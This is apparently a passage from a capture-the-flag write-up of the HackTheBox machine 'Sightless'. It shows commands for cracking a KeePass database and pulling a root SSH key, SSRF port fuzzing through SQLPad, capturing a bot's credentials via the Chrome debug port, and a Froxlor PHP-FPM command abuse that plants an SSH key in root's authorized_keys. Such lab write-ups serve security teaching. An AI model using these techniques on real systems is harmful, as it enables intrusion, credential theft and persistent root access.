c1d78e103d04cc9131d8e3c36aee0dd7d2b9ea47d1863c103f338713ea48dc38bcaf81895a4cf110523e365fc33cb273410c96dbbbae42607524fbd370a6dac7c6e6211cded5895c75e21b45e93b6f243208c377f7d8851e9321d1c27d4d3e29d1e917a9a1b4ba79e20af92fcf6ddb7d8290a3992bbb7277027ef0eb417a13248e72c1f9c00f5d2c148fe8cf2d7268165f365d67f2312651d4464e61f92fa6135f64ea5a45d0de2ceb763114d47c827b95857f33354ea18ff3d4b7fad2b4c89728db903f5e2ccb02020f55c066dd667dc742e44e58c4aba67366a18e3e79a1d809b988ab95a0befca673f8a74ac3010929df6ff9a7974deec2c84103c60051cdb11ddd1b40322b43c2b1e6a648ff1c0ee4799c7e3759d93e634c4b8b028bb9ba6f784e246886bd1a5d1b0468023b74c36cc59e261683c03f827ca348b0ef6a1d54413ce35b73f3aac781d2542407ca0d516ad56461767d99fd9d40974d1da9286d13aa95357bc49bda0436a3d4d6bab6f6c15bd9a5bee51951971a30fda2f006b7abd63fd17174df4f3deb39b43f227e69fae1cb9aa3c2e967939c54b60b9a3ced0355cc28d5c2ed9992e5f48b068eb68ea74893eb67eaeeae275cc33b9a20b3bc098030dd94fcdffe9ae741fc1d49ad5db5512d7fea80549409dc0d6e1de8d52f56e38208e7eaaccb1ce30fd3dee463e3066badefe85e475b3ac25a4fc9f453b0b586c691167671dd43fbddb8a85dc3a1bbdacb3abfbbd2dd6d5dd4f426fe7ef69e2fbb5b033bb6c106d7d82eeb1d22d0e33a5a105aa05853dbd85d21e13f50deaaf9c424071b4cbb7bf3063b7787c389dd22d5cdd4eb9cb6abb38d10d112bdf73aefd47d01b5c3c731ea67b0981f3fccf4f1d37e0308bb20d9267ffeb82cffb143ec561ccce1f508d2847da7e3a03f65339ee4b3fbb514e742a45f45979758fd49222f10ffe66c3b1a476b11195c89dc4489f6c767a0aa2d9e8e947b1b5b294f06ccadf61a8b0252e9c3d68e98dfcafe5d8deafecbf4e78757af065642bf5ada1366b9c9f2b8bbe5062a15f0a5f8d1b2873bdcac2c33f4944a755d364301783819c9e5fcf48b440002893c2394af4958c070b914df256b95fd4e4e8cecc7855bed28356bf5922967e0d892b0c49bdb15dee450ad3ac7310979f32ada1418832087ccd6f9deae1df79c2fd10804515b7ed2f9e3b9282f67c45a66abce990b6950d1ff09bf28be9eefa4a3a1a13bfe8594305502d16a8db77b1e64633af0b4f9717ca2959ffe4cc7883829c66043db21bb490279b3a285230df9bf2ff99e2b7a5e5e9d6e9530d8df761ca87ad555a86685737b4d08c42a4467b085eeed5f20aad6a7359b8f5a3bfe6e91130deabd8911597dd4519fd344efb87c3d9571c71891bb7df0e8deec31ae1d7531cc16d20a3b283504993bfda6fd300c26c63c22e577dad658318f581d08c9d798e0130b6e280a92d469a75491575d3e5aac0735eafbade90ad9ac1301f78e43d4d6af579d8bd7716f2a570ba5f818ee5de2e71629e3df44a66950d189d705ea8808df406ebc701c4e3d5892fa5ad1452cc12bf87d79b386a4c55d48bddb0c5db39617d216025c874c08952a97c01fadfe6d65c0a54b9ddaa2b53e928ea11f2831884:bulldogs
...[snip]...
Started: Mon Sep  9 22:17:29 2024
Stopped: Mon Sep  9 22:18:10 2024

```

The password is “bulldogs”.

#### Enumerate

I’ll open the DB with the password:

```

oxdf@hacky$ kpcli --kdb Database.kdb
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>

```

There’s nothing in the default folders, but there’s a directory `Backup` in `sightless.htb`:

```

kpcli:/> ls
=== Groups ===
General/
kpcli:/> ls General/
=== Groups ===
eMail/
Homebanking/
Internet/
Network/
sightless.htb/
Windows/
kpcli:/> ls General/*
/General/eMail:

/General/Homebanking:

/General/Internet:

/General/Network:

/General/sightless.htb:
=== Groups ===
Backup/

/General/Windows:

```

It’s called `ssh`:

```

kpcli:/> ls General/sightless.htb/Backup/
=== Entries ===
0. ssh

```

`show` will give the value:

```

kpcli:/> show -f General/sightless.htb/Backup/ssh

 Path: /General/sightless.htb/Backup/
Title: ssh
Uname: root
 Pass: q6gnLTB74L132TMdFCpK
  URL: 
Notes: 
Atchm: id_rsa (3428 bytes)

```

There’s a password and an attachment. `attach` will open a menu to interact with attachments so I can download it:

```

kpcli:/> attach General/sightless.htb/Backup/ssh
Atchm: id_rsa (3428 bytes)
Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
Path to file: /home/oxdf/keys/sightless-john
Saved to: /home/oxdf/keys/sightless-john
Atchm: id_rsa (3428 bytes)

```

### SSH

I’ll connect using that SSH key:

```

oxdf@hacky$ ssh -i ~/keys/sightless-john root@sightless.htb 
Last login: Tue Sep 10 01:44:34 2024 from 10.10.14.6
root@sightless:~#

```

And grab `root.txt`:

```

root@sightless:~# cat root.txt
596de66e************************

```

## Beyond Root - SQLPad Brute Force

### Test API Analysis

One idea I had while looking at SQLPad was to use the connection test to check for open ports on the system. Some playing around and I found that the `trino` driver made an HTTP request. When I try `localhost:80`, it returns this message:

![image-20240908164152402](/img/image-20240908164152402.png)

That seems to suggest 80 isn’t open on localhost, which tells me that it’s likely nginx listening on the host and proxying connections to a container or VM on some other port, and that the container / VM isn’t listening on 80.

The SQLPad container listens on 3000 according to the [README](https://github.com/sqlpad/sqlpad?tab=readme-ov-file#docker-image). If I send that request to Burp Repeater, I’ll see the error message changes for port 3000:

![image-20240908164430824](/img/image-20240908164430824.png)

### FUZZ

I’ll use that information to try fuzzing localhost ports using `ffuf`:

```

oxdf@hacky$ ffuf -u http://sqlpad.sightless.htb//api/test-connection -H "Content-Type: application/json" -d '{"name":"0xdf","driver":"trino","data":{"host":"127.0.0.1","port":"FUZZ"},"host":"127.0.0.1","port":"FUZZ"}' -w <( seq 1 65535) -fr ECONNREFUSED -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sqlpad.sightless.htb//api/test-connection
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Content-Type: application/json
 :: Data             : {"name":"0xdf","driver":"trino","data":{"host":"127.0.0.1","port":"FUZZ"},"host":"127.0.0.1","port":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: ECONNREFUSED
________________________________________________

3000                    [Status: 400, Size: 125, Words: 15, Lines: 1, Duration: 122ms]
:: Progress: [65535/65535] :: Job [1/1] :: 274 req/sec :: Duration: [0:03:52] :: Errors: 0 ::

```

I’m using `-w <( seq 1 65535)` as the wordlist. `<()` in Bash just runs the command inside and then treats the output as if it’s in a temp file, which `ffuf` then uses as a wordlist. I’m matching on all codes (since it’ll likely return a 400 regardless), and using `-fr` to hide results with the “ECONNREFUSED” response. Only 3000 is open.

## Beyond Root - Unintended Paths

### Scenarios

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[<a href="#access-froxlor">Admin Access\nto Froxlor</a>]-->B(<a href='#ftp-access'>Update User\nPassword</a>);
    B-->C(<a href="#ftp-access">Update FTP Password</a>);
    C-->D(<a href="#keepass-db">Fetch KDB\nover FTP</a>)
    D-->E(<a href='#keepass-db'>Recover Root\nSSH Key</a>);
    E-->F(<a href="#ssh-1">Root Shell</a>)
    A-->G(<a href="#php-fpm-rce">Modify PHPFPM Binary\nRestart PHPFPM</a>);
    G-->F;
    H[<a href="#ssh">Shell as michael</a>]-->I(<a href="#access-froxlor">Exploit\nCVE-2024-34070</a>)
    I-->A;
    H-->J(<a href="#chrome-debug">Chrome Debug</a>);
    J-->A;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,7,8,11,12 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Chrome Debug

#### Find Debug Port

There is a bot running as john that’s simulating the user being exploited by the [XSS in Froxlor](#access-froxlor). This exposes the Chrome debug port. I’ll find it in the process list:

```

michael@sightless:~$ ps auxww | grep chrome
john        1592  0.4  0.3 33630172 15376 ?      Sl   Sep09   5:01 /home/john/automation/chromedriver --port=56335
john        1597  0.0  0.0      0     0 ?        Z    Sep09   0:00 [chromedriver] <defunct>
john        1602  0.7  2.9 34011320 118828 ?     Sl   Sep09   8:48 /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.f6vfri data:,
john        1605  0.0  0.0 33575860 3200 ?       Sl   Sep09   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 22.04.4 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=125.0.6422.60 --initial-client-fd=6 --shared-client-connection
john        1609  0.0  1.4 33850308 56084 ?      S    Sep09   0:00 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1605 --enable-crash-reporter
john        1610  0.0  1.4 33850308 56280 ?      S    Sep09   0:00 /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1605 --enable-crash-reporter
john        1626  0.6  3.3 34102420 132540 ?     Sl   Sep09   7:02 /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1605 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1627  0.1  2.2 33900068 87848 ?      Sl   Sep09   1:58 /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1605 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,9118898196858484533,9533932057280018725,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter
john        1655  3.6 11.0 1186534252 440028 ?   Sl   Sep09  43:24 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1605 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1725921884484443 --launc

```

On the `chrome` processes, it sets the debug port to 0 with `--remote-debugging-port=0`. That means it will be a random high port each time it starts. I’ll check the `netstat`:

```

michael@sightless:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:39389         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:35297         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:56335         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 

```

After I ignore the ones that seem like well-known ports (21, 22, 53, 80, 3000, 3306, 8080, and 33060), that leaves 39389, 35297, and 56335. The last of these is not it because it’s associated with `chromedriver` in the process list. I’ll forward both the others with SSH to my host.

I’ll open Chromium and go to `chrome://inspect/`. On that page, I’ll click “Configure” and add one of the ports:

![image-20240910142535567](/img/image-20240910142535567.png)

When it I give it the correct port, two entities show up under Remote Target:

![image-20240910142555107](/img/image-20240910142555107.png)

#### Capturing Password

Clicking “inspect” for the first row launches a window showing the activity in dev tools, similar to what I showed for the intended path on [Agile](/2023/08/05/htb-agile.html#chrome-debug):

![image-20240910142753112](/img/image-20240910142753112.png)

At some point the bot will log in:

![image-20240910142839889](/img/image-20240910142839889.png)

Showing the log page where the XSS would occur:

![image-20240910142855090](/img/image-20240910142855090.png)

It’s too fast to catch the password, but I can go to the “Network” tab in dev tools. I’ll want to make sure “Preserve log” is checked so it doesn’t clear after each submission. I’ll filter on “Doc” to get only the page requests (ignoring images, css, etc):

![image-20240910143044087](/img/image-20240910143044087.png)

It’s hard to look through the logs with them changing constantly, so after a couple cycles, I’ll click the red circle at the top left to stop recording network logs. Clicking through the activity, there’s a POST request to `index.php`:

![image-20240910143213202](/img/image-20240910143213202.png)

The payload tab gives the username and password:

![image-20240910143230096](/img/image-20240910143230096.png)

#### Login

Those creds work to get into Froxlor:

![image-20240910143846812](/img/image-20240910143846812.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

From here I can [reset with the customer password](#ftp-access) or [hijack PHP-FPM](#php-fpm-rce).

### PHP-FPM RCE

In Froxlor, under PHP –> PHP-FPM, there’s a list of configurations:

![image-20240910144022645](/img/image-20240910144022645.png)

Clicking edit brings up:

![image-20240910152020506](/img/image-20240910152020506.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The “php-fpm restart command” is interesting! If I try to put any kind of special character into the command, such as `;>&|`, when I click save, it says:

![image-20240910144346693](/img/image-20240910144346693.png)

I’ll create a script in `/dev/shm/0xdf.sh` that will write my SSH public key into the root user’s `authorized_keys` file:

```

#!/bin/bash

mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

```

And set it as the “php-fpm restart command” and save:

![image-20240910152111423](/img/image-20240910152111423.png)

Under System –> Settings, there’s an option for PHP-FPM:

![image-20240910145140313](/img/image-20240910145140313.png)

At the top of this page is a toggle to disable it, which I’ll switch to off, and save:

![image-20240910145227273](/img/image-20240910145227273.png)

Then back again, I’ll toggle it on and save again. After a minute or so, I can SSH in as root using my generated SSH key:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@sightless.htb 
Last login: Tue Sep 10 19:23:41 2024 from 10.10.14.6
root@sightless:~#

```